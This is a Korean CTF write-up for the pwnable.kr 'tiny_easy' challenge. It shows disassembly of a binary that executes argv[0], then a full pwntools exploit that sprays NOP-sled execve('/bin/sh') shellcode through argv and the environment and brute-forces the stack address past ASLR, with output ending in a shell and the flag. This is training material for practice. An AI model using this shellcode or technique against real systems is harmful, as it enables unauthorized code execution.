# [pwnable.kr] tiny_easy writeup

##### [summary] brute force

```shell
I made a pretty difficult pwn task.
However I also made a dumb rookie mistake and made it too easy :(
This is based on real event :) enjoy.

ssh tiny_easy@pwnable.kr -p2222 (pw:guest)
```



objdump로도 코드가 안보이고 심볼이 없어서 gdb로도 알 수가 없어서 일단 scp를 이용해서 바이너리를 받아왔다.

```shell
ch4rli3kop@DESKTOP-D8UTNRD:~/pwn$ scp -P 2222 tiny_easy@pwnable.kr:/home/tiny_easy/tiny_easy /mnt/c/pwn
```



바이너리 닌자를 사용해서 보니 다음과 같았다.

```asm
_start:
pop     eax {__return_addr}
pop     edx {arg1}
mov     edx, dword [edx]
call    edx
```



해당 주소에 브레이크 포인트를 건 뒤 살펴보니 argv[0]를 실행시키는 걸 알 수 있음

근데 여기서 ㅡㅡ gdb로는 argv[0]가 절대주소로 잡혀서 계속 삽질했다..;;

core 파일 생성된 걸로 분석해보니 argv[0]가 들어감.



stack에 실행권한이 있는 바이너리이므로 argv[0]를 shellcode가 있는 stack의 주소로 올려야한다.

aslr이 걸려있으므로 대충 아래와 같이 코드를 짜서 브포돌리면 쉘을 딸 수 있다.

### exploit

```python
#!/usr/bin/python
from pwn import *

payload =  '\x90'*0x100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

_env = {}
_argv = ['\xff\xff\xdf\xff']

for i in range(0x100):
    _env[str(i)] = payload
    _argv.append(payload)

for i in range(0x100):
    r = process(executable='./tiny_easy', argv=_argv ,env=_env)
    try:
        r.sendline('cat flag')
        r.recv(100)
    except:
        print 'sorry..'
        continue

    r.interactive()
```

### result

```shell
tiny_easy@prowl:/tmp/charlie3$ python sol_tiny.py 
[+] Starting local process '/home/tiny_easy/tiny_easy': pid 134785
sorry..
...
[+] Starting local process '/home/tiny_easy/tiny_easy': pid 137324
[*] Switching to interactive mode
$ id
uid=1044(tiny_easy) gid=1044(tiny_easy) egid=1045(tiny_easy_pwn) groups=1045(tiny_easy_pwn),1044(tiny_easy)
$ cat /home/tiny_easy/flag
What a tiny task :) good job!
```

